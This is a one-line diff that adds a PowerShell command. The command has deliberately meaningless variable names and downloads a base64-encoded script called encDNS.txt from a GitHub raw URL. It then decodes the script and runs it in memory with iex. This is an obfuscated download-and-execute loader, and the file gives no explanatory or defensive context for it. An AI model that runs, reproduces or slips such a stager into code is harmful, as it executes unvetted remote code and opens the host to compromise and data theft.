@@ -1,0 +1,1 @@
+$laksfnasfasdzxc = (iwr http://raw.githubusercontent.com/br1337/Scripts/main/encDNS.txt -usebasicparsing).content;$zxcasfasddfgdfgdfg = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($laksfnasfasdzxc)); iex $zxcasfasddfgdfgdfg
